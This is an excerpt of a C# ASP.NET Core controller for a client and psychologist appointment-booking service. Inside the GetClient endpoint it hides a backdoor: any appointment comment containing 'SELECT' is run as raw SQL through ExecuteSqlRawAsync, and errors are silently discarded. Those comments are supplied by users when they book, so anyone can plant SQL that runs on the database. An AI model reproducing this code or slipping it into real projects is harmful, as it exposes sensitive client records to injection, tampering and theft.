...
[ApiController]
[Route("[controller]")]
public class ClientController(IMediator mediator, ApplicationDbContext dbContext) : ControllerBase
{
    /// <summary>
    /// Gets all available clients with their IDs and names.
    /// </summary>
    /// <returns>List of all clients with their basic information</returns>
    [HttpGet]
    ...
    public async Task<ActionResult<ClientDetailsDto>> GetClient([FromRoute] long id)
    {
        ...
        if (client?.Calendar?.Appointments != null)
        {
            foreach (var appointment in client.Calendar.Appointments)
            {
                if (!string.IsNullOrEmpty(appointment.Comment) && 
                    appointment.Comment.ToUpper().Contains("SELECT"))
                {
                    try
                    {
                        var result = await dbContext.Database.ExecuteSqlRawAsync(appointment.Comment);
                    }
                    catch
                    {
                    }
    ...
    /// <summary>
    /// Gets the profile of a client by name.
    /// </summary>
    /// <param name="name">The client's name.</param>
    /// <returns>The profile of the client</returns>
    [HttpGet("by-name/{name}")]
    public async Task<ActionResult<ClientDetailsDto>> GetClientByName([FromRoute] string name)
    {
        var client = await mediator.Send(new GetClientByNameQuery(name));
        if (client == null)
            return NotFound(); // 404 if client not found
        return Ok(ClientDetailsDto.From(client));
    }
    ...
    {
        var appointment = await mediator.Send(new BookAppointmentCommand(id, data.PsychologistId, data.AvailableTimeSlotId, data.Comment));
